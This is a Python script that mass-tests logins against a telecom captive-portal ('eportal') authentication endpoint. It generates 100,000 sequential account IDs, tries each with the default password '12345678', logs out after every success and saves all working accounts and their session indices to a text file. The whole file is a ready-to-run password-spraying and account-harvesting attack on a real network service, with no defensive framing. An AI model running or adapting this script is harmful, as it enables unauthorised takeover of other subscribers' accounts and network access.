from urllib.parse import urlparse
import requests
import json
import os

def generate() -> list:
    """生成测试账户, 可自定义修改"""
    account = []
    for i in range(100000):
        if i<10:
            i = '0000'+str(i)
        elif 10<=i and i<100:
            i = '000'+str(i)
        elif 100<=i and i<1000:
            i = '00'+str(i)
        elif 1000<=i and i<10000:
            i = '0'+str(i)
        elif 10000<=i and i<100000:
            i = str(i)
        else:
            i = str(i)   
        account.append('199820'+i)
    return account

class Telecom():
    def __init__(self) -> None:
        #获取登录信息(ip,mac,loction...)
        check_url = 'http://123.123.123.123/'
        agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
        check_headers= {
            "Host":"123.123.123.123",
            "User-Agent": agent,
            "Connection" : "keep-alive",
            "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
            }
        r0 =requests.get(check_url,headers=check_headers,allow_redirects=False)
        #self.url保存登录信息
        self.url = r0.headers['Location']
    
    def logout(self, userIndex) -> str:
        """
        param: userIndex账户对于的用以登出的参数
        """
        logout_url = 'http://172.25.249.8/eportal/InterFace.do?method=logout'
        agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
        logout_headers= {
            "Host":"172.25.249.8",
            "Origin" : "http://172.25.249.8",
            "Referer" : "http://172.25.249.8/eportal/success.jsp?" + userIndex + "&keepaliveInterval=0",
            "User-Agent": agent,
            "Connection" : "keep-alive",
            "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8"
            }
        logout_postdata = "userIndex=" + userIndex + "&keepaliveInterval=0"
        r1 =requests.post(logout_url,data=logout_postdata,headers=logout_headers)
        r1.encoding='utf-8'
        return r1.text

    def login(self, account, is_logout=False) -> str:
        """
        param: account登录账户
        param: is_logout用以控制是否在登陆后执行登出操作, 默认为否
        """
        login_url = 'http://172.25.249.8/eportal/InterFace.do?method=login'
        agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
        login_headers= {
            "Host":"172.25.249.8",
            "Origin" : "http://172.25.249.8",
            #"Referer" : "http://172.25.249.8/eportal/index.jsp?userip=100.66.80.46&wlanacname=&nasip=171.88.130.251&wlanparameter=9c-eb-e8-e4-c8-79&url=http://123.123.123.123/&userlocation=ethtrunk/3:361.16",
            "Referer" : self.url,
            "User-Agent": agent,
            "Connection" : "keep-alive",
            "Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8"
            }
        #urlparse解析登录网址
        login_postdata = 'userId=' + account + '&password=12345678&service=&queryString=' + urlparse(self.url).query
        r2 =requests.post(login_url,data=login_postdata,headers=login_headers)
        r2.encoding='utf-8'
        result = r2.json()
        print(r2.text)
        if result['result'] == 'success':
            if is_logout == True:
                self.logout(result['userIndex'])
            return result['userIndex']
        else:
            return None
    
account = generate()
account_verifed = {}
Task_pene = Telecom()
for i in range(len(account)):
    return_value = Task_pene.login(account[i], is_logout=True)
    if return_value is not None:
        account_verifed[account[i]] = return_value
for key,name in account_verifed.items():
    print(key + ' : ' + name)
    print('\n')

print("账户总数为: " + str(len(account_verifed)))
current_path = os.path.abspath(".")
file = open('telecom_account.txt', "w")
#转化为json文件进行保存
file.write(json.dumps(account_verifed))
file.close()